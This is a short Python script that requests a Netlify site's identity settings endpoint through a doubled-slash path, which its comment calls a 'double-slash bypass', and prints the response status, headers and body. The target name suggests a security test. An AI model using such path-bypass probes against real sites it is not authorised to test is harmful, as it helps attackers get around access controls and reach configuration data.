# -*- coding: utf-8 -*-
# _idn_settings_full.py - full settings response via double-slash bypass
import json, urllib.request, urllib.error

def req(url):
    r = urllib.request.Request(url)
    try:
        resp = urllib.request.urlopen(r, timeout=25)
        return resp.status, dict(resp.headers), resp.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode('utf-8','replace')
    except Exception as e:
        return 'ERR', {}, str(e)[:200]

st, hd, b = req('https://sec-test-rcf6lz.netlify.app/.netlify//identity/settings')
print('status:', st)
print('headers:', json.dumps({k: v for k, v in hd.items() if k.lower() in ('content-type','server','x-nf-request-id','cache-control')}, indent=1))
print('body:', b[:1500])
